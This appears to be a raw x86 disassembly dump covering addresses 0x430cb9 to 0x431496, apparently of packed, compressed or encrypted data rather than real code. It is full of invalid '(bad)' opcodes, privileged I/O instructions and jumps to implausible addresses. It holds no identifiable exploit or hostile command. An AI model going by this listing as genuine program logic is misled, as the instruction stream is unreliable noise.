  430cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430cba:	(bad)  
  430cbb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430cbc:	test   DWORD PTR [ebx],ecx
  430cbe:	pop    ebp
  430cbf:	push   ss
  430cc0:	fistp  QWORD PTR [edx]
  430cc2:	sbb    al,0xc5
  430cc4:	loop   0x430c63
  430cc6:	imul   eax,DWORD PTR [eax],0xffffffb4
  430cc9:	inc    ecx
  430cca:	mov    ah,0x72
  430ccc:	add    bh,ah
  430cce:	inc    eax
  430ccf:	fld    TBYTE PTR [esi]
  430cd1:	and    BYTE PTR [esi],dh
  430cd3:	xchg   BYTE PTR [eax+0x43],dh
  430cd6:	and    al,BYTE PTR [ebp-0x5143ca6c]
  430cdc:	mov    al,ds:0x69e943ed
  430ce1:	enter  0x2ea1,0x9a
  430ce5:	mov    cl,0x50
  430ce7:	xchg   ebp,eax
  430ce8:	adc    bh,0x36
  430ceb:	sub    DWORD PTR [ecx-0x5c8bb2e5],ebp
  430cf1:	imul   ecx,DWORD PTR [eax+0x4],0x6ca2a46
  430cf8:	mov    ch,0xec
  430cfa:	add    BYTE PTR [edx+0x1581df5b],0xb2
  430d01:	xchg   ecx,eax
  430d02:	enter  0x515b,0xa7
  430d06:	pop    edi
  430d07:	shr    BYTE PTR [edi-0x740f43fd],0x85
  430d0e:	out    0x8,al
  430d10:	cmp    BYTE PTR [edi],0xb3
  430d13:	shl    edx,cl
  430d15:	aaa    
  430d16:	cmp    al,BYTE PTR [edx+0x52a5ec4b]
  430d1c:	jl     0x430d0f
  430d1e:	dec    ebx
  430d1f:	fwait
  430d20:	mov    cl,0x6e
  430d22:	xor    al,0x40
  430d24:	ins    BYTE PTR es:[edi],dx
  430d25:	stos   BYTE PTR es:[edi],al
  430d26:	daa    
  430d27:	xor    bl,dl
  430d29:	and    al,0xe5
  430d2b:	loope  0x430d30
  430d2d:	mov    cl,0xb
  430d2f:	and    al,BYTE PTR [ebx-0x4926b519]
  430d35:	and    ebp,DWORD PTR [eax-0x36d39a5]
  430d3b:	iret   
  430d3c:	(bad)  
  430d3d:	xchg   ebx,eax
  430d3e:	xlat   BYTE PTR ds:[ebx]
  430d3f:	mov    WORD PTR [ecx-0x7924bc18],gs
  430d45:	pop    ecx
  430d46:	lods   eax,DWORD PTR ds:[esi]
  430d47:	fwait
  430d48:	push   ecx
  430d49:	cdq    
  430d4a:	scas   al,BYTE PTR es:[edi]
  430d4b:	xchg   DWORD PTR [ebp-0x55],ebp
  430d4e:	mov    al,ds:0x590beb61
  430d53:	pop    ds
  430d54:	cmp    eax,0xda236a82
  430d59:	test   BYTE PTR ss:[ebp+0x5f],bh
  430d5d:	push   edx
  430d5e:	shr    BYTE PTR [ebp+0x61],1
  430d61:	jmp    0x430d65
  430d63:	sbb    BYTE PTR [edx+ebp*4+0x10],al
  430d67:	jbe    0x430d95
  430d69:	and    BYTE PTR [esi-0x16],dh
  430d6c:	ret    0x4d6
  430d6f:	adc    bh,BYTE PTR [eax+0xe]
  430d72:	xchg   ecx,eax
  430d73:	cli    
  430d74:	xchg   esp,eax
  430d75:	cdq    
  430d76:	or     ch,BYTE PTR [eax-0x15]
  430d79:	mov    bl,bl
  430d7b:	enter  0x23da,0x80
  430d7f:	mov    eax,0x6397d1b4
  430d84:	iret   
  430d85:	cmc    
  430d86:	fdiv   QWORD PTR [esi]
  430d88:	mov    esi,0x1e6b6b71
  430d8d:	stos   BYTE PTR es:[edi],al
  430d8e:	or     BYTE PTR [eax+edx*1-0xa],bh
  430d92:	adc    eax,eax
  430d94:	stos   BYTE PTR es:[edi],al
  430d95:	add    cl,dl
  430d97:	jle    0x430df1
  430d99:	mov    edx,0xa99155b0
  430d9e:	retf   0xa741
  430da1:	clc    
  430da2:	pushf  
  430da3:	ficom  DWORD PTR [ecx-0x13]
  430da6:	or     BYTE PTR [edx+eiz*8-0x44cf2a5],0xec
  430dae:	test   al,0xea
  430db0:	(bad)  
  430db1:	rcl    BYTE PTR [edi],1
  430db3:	mov    al,0x7
  430db5:	mov    ebx,DWORD PTR [esp+eiz*4]
  430db8:	rcl    DWORD PTR [esp+esi*2],1
  430dbb:	imul   edi,esp,0xfffffffe
  430dbe:	lea    edi,[edi]
  430dc0:	and    ebp,DWORD PTR [ebx-0x47ae44ba]
  430dc6:	push   esp
  430dc7:	mov    eax,0x5421496f
  430dcc:	dec    esp
  430dcd:	sahf   
  430dce:	test   BYTE PTR [ebp-0x73],dl
  430dd1:	dec    ebx
  430dd2:	in     eax,dx
  430dd3:	ret    
  430dd4:	dec    ecx
  430dd5:	stos   BYTE PTR es:[edi],al
  430dd6:	and    BYTE PTR [edi+0x404da8ae],bl
  430ddc:	ins    DWORD PTR es:[edi],dx
  430ddd:	dec    ebx
  430dde:	xlat   BYTE PTR ds:[ebx]
  430ddf:	nop
  430de0:	push   0x5baf9466
  430de5:	mov    ebx,0xc9386ed1
  430dea:	and    al,0xe0
  430dec:	sub    DWORD PTR [edi],0xe80777d
  430df2:	push   eax
  430df3:	mov    bh,0x6
  430df5:	and    BYTE PTR [edx+0x3f1da2e5],0x60
  430dfc:	in     eax,dx
  430dfd:	add    BYTE PTR [eax+0x53],ah
  430e00:	jne    0x430db8
  430e02:	fcmovbe st,st(4)
  430e04:	mov    al,0x21
  430e06:	ins    DWORD PTR es:[edi],dx
  430e07:	mov    ah,0xb
  430e09:	pop    ds
  430e0a:	push   edx
  430e0b:	and    eax,0xb09b2b52
  430e10:	dec    esi
  430e11:	ins    DWORD PTR es:[edi],dx
  430e12:	mov    bh,0x26
  430e14:	sub    BYTE PTR [esi+0xa],0xa3
  430e18:	lods   al,BYTE PTR ds:[esi]
  430e19:	and    DWORD PTR [edi],edi
  430e1b:	gs in  al,dx
  430e1d:	adc    BYTE PTR ds:0xe6adc05,cl
  430e23:	inc    eax
  430e24:	fisttp WORD PTR [ecx-0x2e]
  430e27:	inc    ecx
  430e28:	bound  edi,QWORD PTR [ebx+0x12896c6d]
  430e2e:	ror    BYTE PTR [edi-0x2],0x56
  430e32:	lahf   
  430e33:	pop    edi
  430e34:	vpaddsw ymm0,ymm2,YMMWORD PTR [eax]
  430e39:	neg    BYTE PTR [esi+0x447153fa]
  430e3f:	shr    DWORD PTR [ecx+edx*1],cl
  430e42:	mov    ah,0xd
  430e44:	out    0x70,al
  430e46:	mov    ebx,0xad84e4a7
  430e4b:	add    al,0x1b
  430e4d:	shld   DWORD PTR [edx+0x27],ebp,cl
  430e51:	inc    BYTE PTR [eax-0x7a48fa95]
  430e57:	(bad)  
  430e58:	ret    0xcd27
  430e5b:	inc    esi
  430e5c:	adc    al,0xb6
  430e5e:	rcl    esp,1
  430e60:	dec    edx
  430e61:	mov    bh,0x5c
  430e63:	or     eax,0x16343707
  430e68:	jmp    0x430e59
  430e6a:	cmc    
  430e6b:	inc    edx
  430e6c:	add    ebp,DWORD PTR [edx-0x24]
  430e6f:	inc    ecx
  430e70:	aam    0xec
  430e72:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430e73:	inc    ebx
  430e74:	inc    eax
  430e75:	test   DWORD PTR [esi],eax
  430e77:	call   0x5d90f34e
  430e7c:	mov    ds:0xaa67d40b,al
  430e81:	ins    DWORD PTR es:[edi],dx
  430e82:	pop    ss
  430e83:	retf   0xe2e
  430e86:	cs scas al,BYTE PTR es:[edi]
  430e88:	ja     0x430f04
  430e8a:	pop    eax
  430e8b:	sbb    edx,0x26
  430e8e:	mov    cl,BYTE PTR ds:0xaed12453
  430e94:	int    0x77
  430e96:	inc    ecx
  430e97:	mov    al,0xdd
  430e99:	push   ss
  430e9a:	jbe    0x430e4e
  430e9c:	add    eax,0xa56e74b6
  430ea1:	cmp    ecx,DWORD PTR [eax+0x66ca0d0b]
  430ea7:	mov    eax,DWORD PTR [edi+0x54b6211b]
  430ead:	fstp   QWORD PTR [ecx+ecx*4+0x4a]
  430eb1:	pop    esp
  430eb2:	mov    bh,0x4d
  430eb4:	push   0xb5a3bf2b
  430eb9:	jb     0x430e5e
  430ebb:	xchg   ebp,eax
  430ebc:	push   cx
  430ebe:	(bad)  [esi]
  430ec0:	pminsw mm2,QWORD PTR [ecx]
  430ec3:	mov    cl,0x1
  430ec5:	push   0xffffff87
  430ec7:	mov    ebx,0x6c45d34a
  430ecc:	add    al,0x5d
  430ece:	ins    DWORD PTR es:[edi],dx
  430ecf:	and    bh,BYTE PTR [ebp+eiz*1-0x15]
  430ed3:	mov    ds:0x5aae1d88,al
  430ed8:	outs   dx,DWORD PTR ds:[esi]
  430ed9:	arpl   WORD PTR [esi],cx
  430edb:	sbb    eax,0x6216aa26
  430ee0:	(bad)  
  430ee1:	dec    ebx
  430ee2:	mov    cl,0x7f
  430ee4:	adc    eax,0x77a28d8d
  430ee9:	retf   0x3d2
  430eec:	mov    dh,0x8d
  430eee:	lods   eax,DWORD PTR ds:[esi]
  430eef:	ins    DWORD PTR es:[edi],dx
  430ef0:	repz mov ds:0xff107dc8,eax
  430ef6:	xor    eax,0xb80af5bc
  430efb:	aam    0x8
  430efd:	dec    esp
  430efe:	pop    ss
  430eff:	out    dx,eax
  430f00:	push   ebx
  430f01:	ins    DWORD PTR es:[edi],dx
  430f02:	(bad)  [eax+0x1cd0b7ed]
  430f08:	enter  0x4056,0x62
  430f0c:	and    ebp,DWORD PTR [esi+0x44]
  430f0f:	popa   
  430f10:	add    edx,esp
  430f12:	xchg   edx,eax
  430f13:	and    edx,DWORD PTR [edx+ebp*8+0x1e97408f]
  430f1a:	mov    al,ds:0x9889f26a
  430f1f:	push   esi
  430f20:	repz out 0xdb,al
  430f23:	(bad)  
  430f24:	add    al,0x0
  430f26:	outs   dx,BYTE PTR ds:[esi]
  430f27:	xor    esp,edx
  430f29:	imul   edi,DWORD PTR [esi],0x6d
  430f2c:	in     eax,dx
  430f2d:	mov    bl,BYTE PTR [ebx]
  430f2f:	lods   eax,DWORD PTR ds:[esi]
  430f30:	sbb    eax,0x182d2ab5
  430f35:	rol    BYTE PTR [esi],0x15
  430f38:	mov    al,0xb4
  430f3a:	xor    eax,0x47372d01
  430f3f:	pop    esi
  430f40:	repnz adc al,0xda
  430f43:	jmp    0x876:0x49d9b808
  430f4a:	mov    dl,bh
  430f4c:	fbld   TBYTE PTR [esi]
  430f4e:	call   0x2660682d
  430f53:	(bad)  
  430f54:	ret    
  430f55:	addr16 js 0x430f23
  430f58:	mov    dh,0x15
  430f5a:	stos   BYTE PTR es:[edi],al
  430f5b:	test   esi,ebp
  430f5d:	jl     0x430f0e
  430f5f:	clc    
  430f60:	xor    cl,ah
  430f62:	mov    ecx,0xe202ed55
  430f67:	xor    esp,DWORD PTR [edx+0x11ba2658]
  430f6d:	sub    al,0x41
  430f6f:	or     eax,0x80c0fbfb
  430f74:	mov    edi,DWORD PTR [edx-0x6c72c92c]
  430f7a:	fld    QWORD PTR [eax+0x752e245c]
  430f80:	inc    eax
  430f81:	aad    0xb6
  430f83:	mov    cl,0x32
  430f85:	or     DWORD PTR [eax+0x269efe71],ebp
  430f8b:	and    BYTE PTR [eax-0x261b430],bh
  430f91:	in     eax,dx
  430f92:	or     DWORD PTR [edx+0x6d],eax
  430f95:	push   edi
  430f96:	adc    al,0xb7
  430f98:	pop    ecx
  430f99:	jge    0x430f91
  430f9b:	pop    ss
  430f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430f9d:	inc    esi
  430f9e:	mov    al,ds:0xec4452f
  430fa3:	cmp    BYTE PTR [eax-0x2335dc07],0xea
  430faa:	sub    bl,dl
  430fac:	push   eax
  430fad:	xchg   edx,eax
  430fae:	test   esp,edx
  430fb0:	icebp  
  430fb1:	inc    ebx
  430fb2:	add    ch,BYTE PTR [edx+0x75]
  430fb5:	push   esp
  430fb6:	pop    esp
  430fb7:	push   0x2ca3a648
  430fbc:	sti    
  430fbd:	test   BYTE PTR [edx+0x68bb5b1b],0x42
  430fc4:	outs   dx,BYTE PTR ds:[esi]
  430fc5:	lds    ebx,FWORD PTR [esi+eax*8+0x7e]
  430fc9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430fca:	loop   0x430fcd
  430fcc:	add    BYTE PTR [edi],dl
  430fce:	call   0x86c1:0x53e2b98d
  430fd5:	test   al,0x6d
  430fd7:	(bad)  [ebp+0x690ec2f8]
  430fdd:	mov    esp,0x50da9636
  430fe2:	aaa    
  430fe3:	fidiv  DWORD PTR [edi]
  430fe5:	mov    ebp,0x2a541e47
  430fea:	push   edx
  430feb:	push   ecx
  430fec:	jae    0x430f73
  430fee:	mov    es,WORD PTR [edx+0x4a30aa58]
  430ff4:	fdivrp st(1),st
  430ff6:	mov    dh,0x42
  430ff8:	shl    DWORD PTR [eax-0x402a44a3],1
  430ffe:	pop    edi
  430fff:	inc    edx
  431000:	pop    es
  431001:	adc    ah,bl
  431003:	enter  0xf305,0x13
  431007:	div    ecx
  431009:	ins    BYTE PTR es:[edi],dx
  43100a:	sbb    ecx,DWORD PTR [ebp+0x6e041eed]
  431010:	push   ecx
  431011:	push   edi
  431012:	pop    ebp
  431013:	rol    DWORD PTR [esi+0x2db1b5f3],cl
  431019:	sub    al,0x9a
  43101b:	inc    ebp
  43101c:	fptan  
  43101e:	das    
  43101f:	or     BYTE PTR [ebx],bl
  431021:	dec    ebx
  431022:	fdivr  QWORD PTR [edx-0x198645de]
  431028:	add    DWORD PTR [ecx+0x4e],edx
  43102b:	mov    bl,0xd
  43102d:	add    eax,0x1356e20
  431032:	inc    edi
  431033:	sub    eax,0x28f4642b
  431038:	fisubr DWORD PTR ss:[esi]
  43103b:	xchg   esp,eax
  43103c:	mov    esi,0x3d42adde
  431041:	or     ch,BYTE PTR [esi+0x34]
  431044:	ss nop
  431046:	call   0x111c8b78
  43104b:	inc    ebx
  43104c:	add    BYTE PTR [edi-0x1cdf572],dh
  431052:	dec    ebx
  431053:	popf   
  431054:	push   0x6001b6da
  431059:	stos   DWORD PTR es:[edi],eax
  43105a:	jbe    0x4310c9
  43105c:	cmp    ebx,DWORD PTR [edx]
  43105e:	(bad)
  431062:	jecxz  0x431005
  431064:	and    BYTE PTR [edx-0x533621af],cl
  43106a:	adc    al,0x6c
  43106c:	pop    ebp
  43106d:	push   ebp
  43106e:	adc    esi,DWORD PTR [edi]
  431070:	clc    
  431071:	shr    DWORD PTR [esi],cl
  431073:	je     0x4310ba
  431075:	mov    ch,0x99
  431077:	dec    ecx
  431078:	lods   al,BYTE PTR ds:[esi]
  431079:	or     dl,BYTE PTR [ecx-0x3d3b9f60]
  43107f:	and    BYTE PTR cs:[edi-0x32bf9326],dl
  431086:	in     al,dx
  431087:	mov    ah,BYTE PTR [edx+0x7]
  43108a:	xor    ah,dh
  43108c:	adc    ecx,edx
  43108e:	jge    0x431015
  431090:	push   es
  431091:	and    dh,BYTE PTR [esi+0x5]
  431094:	pop    ebp
  431095:	shl    BYTE PTR [ebx+0x72a5d47d],cl
  43109b:	mov    esi,ebp
  43109d:	mov    ecx,eax
  43109f:	call   0x68cb599f
  4310a4:	or     al,BYTE PTR [eax-0x4b7f0eb3]
  4310aa:	(bad)  
  4310ac:	mov    dh,0x29
  4310ae:	fimul  DWORD PTR [eax+0x4c62fa4f]
  4310b4:	push   0xffffff9e
  4310b6:	ins    BYTE PTR es:[edi],dx
  4310b7:	sub    eax,0x566dda0a
  4310bc:	imul   edx,DWORD PTR [ecx],0xd5ba9d52
  4310c2:	cs jbe 0x431128
  4310c5:	neg    BYTE PTR [edi+0x6a]
  4310c8:	ss punpckhwd mm0,mm5
  4310cc:	inc    esi
  4310cd:	rol    DWORD PTR [edx],0xe6
  4310d0:	add    cl,BYTE PTR [ecx]
  4310d2:	mov    bl,0x88
  4310d4:	fild   DWORD PTR [edx+0x3]
  4310d7:	call   0xc892756d
  4310dc:	imul   edx,esi,0xffffff88
  4310df:	or     eax,0x91216c05
  4310e4:	cs out 0x2a,eax
  4310e7:	js     0x431155
  4310e9:	jge    0x43109f
  4310eb:	add    esp,DWORD PTR [edi]
  4310ed:	ins    BYTE PTR es:[edi],dx
  4310ee:	nop
  4310ef:	jbe    0x43111b
  4310f1:	add    DWORD PTR [ebx],edx
  4310f3:	sub    eax,0x516e3615
  4310f8:	sbb    BYTE PTR ds:[bx+0x2d0],dh
  4310fe:	adc    DWORD PTR [ebx],ecx
  431100:	inc    eax
  431101:	or     ebx,DWORD PTR [ebx-0x2c]
  431104:	les    ebp,FWORD PTR [eax]
  431106:	mul    BYTE PTR [ecx+0x344bb5a]
  43110c:	push   ecx
  43110d:	test   eax,0x6368d09f
  431112:	(bad)  
  431113:	in     eax,dx
  431114:	mov    dl,0x6d
  431116:	pop    ebx
  431117:	out    dx,eax
  431118:	mov    bl,0xe3
  43111a:	mov    dh,0x7d
  43111c:	sub    ebp,DWORD PTR [edx-0x3fab2b83]
  431122:	scas   al,BYTE PTR es:[edi]
  431123:	xor    BYTE PTR [ebx+ebx*1],0x86
  431127:	ja     0x4310a9
  431129:	fdivr  DWORD PTR [eax+0x9e6e5d1]
  43112f:	call   0xd8df:0xf228420a
  431136:	push   0xffffff9c
  431138:	fcmovnb st,st(1)
  43113a:	push   esi
  43113b:	fadd   st,st(1)
  43113d:	push   ecx
  43113e:	add    BYTE PTR [esi],ch
  431140:	and    al,0x0
  431142:	lds    edi,FWORD PTR [ebx+0x0]
  431145:	pop    ebx
  431146:	add    eax,ebp
  431148:	xor    eax,0x60c530b8
  43114d:	or     BYTE PTR ds:0x7b2a2d55,0x77
  431154:	jle    0x4310e2
  431156:	adc    eax,0x43806db1
  43115b:	popf   
  43115c:	(bad)  
  43115d:	sub    al,0x2b
  43115f:	cmp    esp,DWORD PTR [edx]
  431161:	outs   dx,BYTE PTR ds:[esi]
  431162:	or     eax,0x21ef53da
  431167:	loop   0x431170
  431169:	sub    DWORD PTR [esi-0x49],0x6d
  43116d:	imul   ebp,DWORD PTR [ebx-0x53],0x17aa236e
  431174:	xchg   ebp,eax
  431175:	mov    ds:0xacdcfec,eax
  43117a:	lods   eax,DWORD PTR ds:[esi]
  43117b:	mov    dh,0x6d
  43117d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43117e:	rol    BYTE PTR [edi+0x60],1
  431181:	pop    ecx
  431182:	int    0xfb
  431184:	inc    eax
  431185:	shl    BYTE PTR [edi],0x16
  431188:	dec    ecx
  431189:	fldenv [edx]
  43118b:	inc    eax
  43118c:	(bad)  
  43118d:	sub    eax,0x67d6db51
  431192:	add    edx,DWORD PTR [eax+0xa]
  431195:	out    0x6a,al
  431197:	in     eax,0x7f
  431199:	sbb    cl,BYTE PTR [eax]
  43119b:	ss add eax,0x6e28c211
  4311a1:	adc    al,0x5b
  4311a3:	and    ecx,DWORD PTR [edx]
  4311a5:	xchg   edi,eax
  4311a6:	cmp    BYTE PTR [eax],bh
  4311a8:	(bad)  
  4311aa:	ds mov al,0x88
  4311ad:	inc    edx
  4311ae:	mov    eax,ds:0xb7ee8001
  4311b3:	dec    esi
  4311b4:	cmp    eax,0xeb7555cc
  4311b9:	adc    ch,0x32
  4311bc:	pop    esp
  4311bd:	lahf   
  4311be:	dec    eax
  4311bf:	call   0x8613c77a
  4311c4:	cmp    eax,0x297ce488
  4311c9:	cwde   
  4311ca:	jns    0x4311de
  4311cc:	xor    BYTE PTR [ebp*8+0x1ebce920],al
  4311d3:	lods   al,BYTE PTR ds:[esi]
  4311d4:	cmp    ah,BYTE PTR [eax-0x29927ea6]
  4311da:	fidiv  WORD PTR [ebp+0x28858a88]
  4311e0:	out    dx,eax
  4311e1:	sub    al,0x41
  4311e3:	les    ebp,FWORD PTR [ebp+0xc508eed]
  4311e9:	push   esi
  4311ea:	mov    dh,0x29
  4311ec:	sub    BYTE PTR [esi-0x4089f7df],dh
  4311f2:	push   esp
  4311f3:	or     esp,DWORD PTR [esi+0x55efb6b9]
  4311f9:	aaa    
  4311fa:	push   ss
  4311fb:	mov    dh,0x3e
  4311fd:	push   ebx
  4311fe:	jl     0x43118c
  431200:	shl    WORD PTR [ebx],cl
  431203:	lds    ecx,FWORD PTR [esi]
  431205:	or     BYTE PTR [ebp+0x53],0xf0
  431209:	sbb    al,0x90
  43120b:	and    dl,BYTE PTR ds:0x44d6dba2
  431211:	je     0x431292
  431213:	pop    esp
  431214:	frstor [ecx-0x25255409]
  43121a:	lods   eax,DWORD PTR ds:[esi]
  43121b:	sub    DWORD PTR [esi+esi*1-0x67fdd63b],0xb
  431223:	mov    edi,0x58597414
  431228:	jno    0x4311bc
  43122a:	mov    ch,0x5f
  43122c:	out    0xb5,al
  43122e:	jmp    0x3bcf:0xc8d6ea02
  431235:	adc    DWORD PTR [ecx],0xffffff8d
  431238:	jnp    0x4311fc
  43123a:	(bad)  
  43123b:	adc    al,0x5c
  43123d:	outs   dx,BYTE PTR ds:[esi]
  43123e:	or     ebp,ecx
  431240:	mov    cl,BYTE PTR [edx-0x6b]
  431243:	mov    edx,0x6d4137
  431248:	loopne 0x4312b5
  43124a:	mov    edx,ebp
  43124c:	mov    bl,0xf4
  43124e:	test   al,0xdb
  431250:	mov    dh,0x75
  431252:	add    BYTE PTR [eax-0x2],0x9c
  431256:	mov    dh,0x22
  431258:	mov    esi,edx
  43125a:	jle    0x431236
  43125c:	ins    DWORD PTR es:[edi],dx
  43125d:	stos   DWORD PTR es:[edi],eax
  43125e:	and    ecx,DWORD PTR [eax+ecx*4+0x5b]
  431262:	in     al,dx
  431263:	(bad)  
  431264:	push   edx
  431265:	sub    eax,0x65a5b762
  43126a:	fild   DWORD PTR [esi+0x4d3005be]
  431270:	sbb    eax,0x1b04b33c
  431275:	shl    BYTE PTR [ebp-0x2b259253],0xbc
  43127c:	in     al,dx
  43127d:	repz sub DWORD PTR [edx],ebx
  431280:	inc    edx
  431281:	shl    BYTE PTR [esi+0x1c7354da],1
  431287:	imul   eax,DWORD PTR [eax-0x49c83ae2],0xffffffa2
  43128e:	pop    esp
  43128f:	push   0xe27b7d24
  431294:	fbld   TBYTE PTR [edx+0x75505362]
  43129a:	pop    DWORD PTR fs:[edx-0x55]
  43129e:	pusha  
  43129f:	jmp    0x4312a2
  4312a1:	imul   ebx,DWORD PTR [edx],0x61
  4312a4:	or     al,BYTE PTR [edx-0x1257f126]
  4312aa:	dec    ecx
  4312ab:	jb     0x43124e
  4312ad:	clc    
  4312ae:	rcl    BYTE PTR [eax-0x69],0x26
  4312b2:	mov    eax,0x5971075
  4312b7:	neg    BYTE PTR [ebp-0x76a68c94]
  4312bd:	add    ax,0xa6d0
  4312c1:	mov    bh,BYTE PTR [edx-0x24f4125b]
  4312c7:	mov    dh,0xd0
  4312c9:	xor    eax,0xa7244681
  4312ce:	cld    
  4312cf:	pop    esp
  4312d0:	pushf  
  4312d1:	aaa    
  4312d2:	mov    dh,0x22
  4312d4:	mov    edx,0x83e7b682
  4312d9:	or     DWORD PTR [edi-0x28],esp
  4312dc:	aaa    
  4312dd:	fmul   DWORD PTR [ebp+edx*1+0x65]
  4312e1:	xor    ecx,DWORD PTR [edi-0xbe91f6e]
  4312e7:	mov    ch,0x5b
  4312e9:	inc    edi
  4312ea:	inc    eax
  4312eb:	push   ds
  4312ec:	xlat   BYTE PTR ds:[ebx]
  4312ed:	xlat   BYTE PTR ds:[ebx]
  4312ee:	dec    edx
  4312ef:	add    al,0x83
  4312f1:	or     BYTE PTR [esi+0x23e6b116],dh
  4312f7:	push   edx
  4312f8:	adc    DWORD PTR [ebx-0x4a],ecx
  4312fb:	inc    esp
  4312fc:	mov    al,0xd0
  4312fe:	icebp  
  4312ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431300:	fwait
  431301:	int3   
  431302:	xchg   esp,eax
  431303:	jecxz  0x4312b2
  431305:	ins    DWORD PTR es:[edi],dx
  431306:	or     esi,DWORD PTR [edi-0x47ebcbe3]
  43130c:	mov    bl,0xd1
  43130e:	rol    DWORD PTR [ebx+0x5746d2cb],0xd1
  431315:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  431316:	or     al,0x74
  431318:	push   0xb61a9a78
  43131d:	or     DWORD PTR [edx+0x62ad17ed],0x22d1317e
  431327:	inc    esp
  431328:	imul   ebx,DWORD PTR [ebx-0x49],0xffffffda
  43132c:	ins    BYTE PTR es:[edi],dx
  43132d:	inc    ecx
  43132e:	in     eax,0x9f
  431330:	jmp    DWORD PTR [edi+0x35]
  431333:	fwait
  431334:	cmp    edi,esp
  431336:	(bad)  
  431337:	bnd jbe 0x4312fd
  43133a:	dec    DWORD PTR [ebp-0x1c]
  43133d:	add    BYTE PTR [ebx+0x25d940fd],al
  431343:	add    BYTE PTR [ebx-0x4c],al
  431346:	sub    DWORD PTR [eax+0x7],esp
  431349:	mov    ah,0x47
  43134b:	sbb    DWORD PTR [esi+esi*8+0x7f],esi
  43134f:	add    eax,0x75a16160
  431354:	push   0xffffffcb
  431356:	jg     0x431366
  431358:	and    al,0x6d
  43135a:	test   al,0x6e
  43135c:	or     ebp,DWORD PTR [ebx]
  43135e:	dec    eax
  43135f:	add    cl,bh
  431361:	mov    bh,0x44
  431363:	ja     0x43134f
  431365:	ficomp DWORD PTR [edx]
  431367:	fld    TBYTE PTR [ebp+0x756e292f]
  43136d:	xor    ah,BYTE PTR [ebp+0x4e]
  431370:	add    dl,dh
  431372:	or     eax,0x355c2da0
  431377:	xchg   ebp,edx
  431379:	xchg   esp,eax
  43137a:	pop    esp
  43137b:	gs jmp 0x41ae8a51
  431381:	pop    ecx
  431382:	mov    ecx,0xd8bf1507
  431387:	or     DWORD PTR [edx+0x60],edi
  43138a:	sti    
  43138b:	mov    ecx,0xcf0885d4
  431390:	js     0x43140e
  431392:	lea    esi,[esi+0x28]
  431395:	outs   dx,BYTE PTR ds:[esi]
  431396:	ins    DWORD PTR es:[edi],dx
  431397:	push   0x2
  431399:	bound  edi,QWORD PTR [ebp+0x2a6eed9d]
  43139f:	mov    edi,0x924bd2c5
  4313a4:	sbb    eax,DWORD PTR [edx+eiz*1+0x490400ec]
  4313ab:	push   edx
  4313ac:	ret    
  4313ad:	add    al,0x5c
  4313af:	xchg   BYTE PTR [edi],ah
  4313b1:	call   0x6c23f459
  4313b6:	aaa    
  4313b7:	fiadd  DWORD PTR [ebp-0x7906c09c]
  4313bd:	dec    eax
  4313be:	enter  0x8961,0x5c
  4313c2:	jbe    0x4313d8
  4313c4:	lds    ebp,FWORD PTR [ebp-0x21]
  4313c7:	push   ebx
  4313c8:	sub    al,0x53
  4313ca:	or     al,0x89
  4313cc:	cmp    dl,cl
  4313ce:	lods   eax,DWORD PTR ds:[esi]
  4313cf:	sub    DWORD PTR [edx],eax
  4313d1:	and    al,0xc5
  4313d3:	outs   dx,BYTE PTR ds:[esi]
  4313d4:	jns    0x4313d7
  4313d6:	push   ebx
  4313d7:	les    esi,FWORD PTR [esi-0x25]
  4313da:	add    dh,BYTE PTR [edx-0x6b]
  4313dd:	dec    edi
  4313de:	data16 aam 0x3f
  4313e1:	dec    eax
  4313e2:	sbb    ch,BYTE PTR [eax-0x1a8e96a5]
  4313e8:	rol    DWORD PTR [edi+0x72],1
  4313eb:	dec    edx
  4313ec:	ret    
  4313ed:	dec    ebp
  4313ee:	mov    edx,0xbdc1435
  4313f3:	mov    cl,0xe0
  4313f5:	inc    esi
  4313f6:	pop    ebp
  4313f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4313f8:	(bad)  
  4313fa:	fsubr  QWORD PTR [edx-0x14]
  4313fd:	mov    al,ds:0x5ad34fb5
  431402:	add    DWORD PTR [esi],esi
  431404:	clc    
  431405:	inc    eax
  431406:	and    cl,0x50
  431409:	aas    
  43140a:	cmp    dl,dl
  43140c:	mov    dh,0x6d
  43140e:	cmp    al,0x33
  431410:	or     DWORD PTR [edx+0x10],ebx
  431413:	xchg   ebp,eax
  431414:	retf   
  431415:	cmp    ecx,DWORD PTR [eax+0x6e]
  431418:	fisubr DWORD PTR [ebp-0x69cf3ffa]
  43141e:	and    eax,0x896b5d13
  431423:	loop   0x4313fb
  431425:	or     BYTE PTR [ecx-0x55088ec5],dl
  43142b:	sbb    ebx,DWORD PTR [edi]
  43142d:	pop    esp
  43142e:	mov    al,ds:0x444aeb0
  431433:	mov    DWORD PTR ds:[ecx],ecx
  431436:	xchg   ebx,eax
  431437:	cmp    BYTE PTR [eax-0x41b6a44b],0xf2
  43143e:	mov    ecx,0xea32354a
  431443:	(bad)  
  431444:	push   eax
  431445:	cmp    eax,DWORD PTR [eax]
  431447:	and    al,0xaf
  431449:	popf   
  43144a:	enter  0x7e35,0x53
  43144e:	sbb    ebp,ebp
  431450:	add    dh,ch
  431452:	bound  edi,QWORD PTR [esp+esi*1]
  431455:	xor    dh,ah
  431457:	adc    dl,BYTE PTR ds:0x803e080e
  43145d:	fmul   QWORD PTR [esi]
  43145f:	sub    cl,BYTE PTR [eax-0x7a723aaf]
  431465:	(bad)  
  431466:	icebp  
  431467:	lahf   
  431468:	js     0x431440
  43146a:	aaa    
  43146b:	mov    dh,0x26
  43146d:	test   al,0xd8
  43146f:	jecxz  0x43145b
  431471:	(bad)  
  431472:	sbb    al,0xa9
  431474:	push   ebx
  431475:	push   0xd8dc2d50
  43147a:	add    bh,bl
  43147c:	sbb    BYTE PTR [edi-0x2],ah
  43147f:	xor    al,0x34
  431481:	pop    ebx
  431482:	ror    BYTE PTR [ecx+0x66a08f5d],0x76
  431489:	rcl    BYTE PTR [ecx],cl
  43148b:	cmc    
  43148c:	pop    ebx
  43148d:	fsubr  DWORD PTR [esi-0x62]
  431490:	cmp    ecx,DWORD PTR ds:0xed8e41a1
  431496:	jno    0x431453
